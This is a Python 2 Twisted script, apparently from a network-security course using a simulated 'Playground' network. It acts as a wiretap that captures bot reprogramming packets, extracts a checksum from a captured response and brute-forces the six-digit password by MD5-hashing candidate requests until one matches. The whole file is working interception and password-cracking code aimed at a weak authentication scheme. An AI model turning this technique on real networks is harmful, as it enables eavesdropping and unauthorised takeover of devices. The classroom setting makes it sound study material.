from playground.twisted import endpoints
from twisted.internet.protocol import Protocol, Factory
from twisted.internet import reactor
from bot.common.network import ReprogrammingRequest, ReprogrammingResponse
import md5
import time

class DumpProtocol(Protocol):
    def dataReceived(self, data):

        try:
            packet, bytesUsed = ReprogrammingRequest.Deserialize(data)
            packetType = "request"
        except:
            packet, bytesUsed = ReprogrammingResponse.Deserialize(data)
            packetType = "response"

        print "TAP received %d bytes from %s to %s, packetType: %s,  checksum: %s" % (
        len(data), self.transport.getPeer(), self.transport.getHost(), packetType, packet.Checksum)
        # resp, bytesUsed = ReprogrammingResponse.Deserialize(data) # wherReprogramme 's' is the string above

        # realChecksum = req.Checksum  # should be 59a42a27f07347f94d5d9fa58fa51ba3
        if packetType == "response":
            Checksum = data.split(" ")[9]
            print Checksum
            with open("serialized_data", "w") as f:
                f.write(Checksum)
            f.close()
            print "Extracted Checksum"

        if packetType == "request":
            time.sleep(0.5)
            print "Starting"
            f = open("serialized_data", "r")
            realChecksum = f.read()
            f.close()
            # reqPacket, bytesUsed = ReprogrammingRequest.Deserialize(reqData)

            for i in range(0, 999999):
                packet.Checksum = str(int(i)).zfill(6)
                testChecksum = md5.new(packet.__serialize__()).hexdigest()

                if realChecksum == testChecksum:
                    print packet.Checksum
                    print "Found password: %s" % str(int(i)).zfill(6)
                    break
            print "Ended"


class DumpFactory(Factory):
    protocol = DumpProtocol


def tap(address, port, gateTcpPort=9091):
    settings = endpoints.PlaygroundNetworkSettings()
    settings.changeGate(gateTcpPort=gateTcpPort)
    settings.requestSpecificAddress(address)

    tap = endpoints.GateServerEndpoint(reactor, port, settings)

    protocolFactory = DumpFactory()

    tap.listen(protocolFactory)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs=2)
    parser.add_argument("--gate-port", type=int, default=9091)

    opts = parser.parse_args()
    tapAddress, tapPort = opts.target
    tapPort = int(tapPort)

    print "Starting simple playground 'wiretap'"
    tap(tapAddress, tapPort, gateTcpPort=opts.gate_port)
    reactor.run()
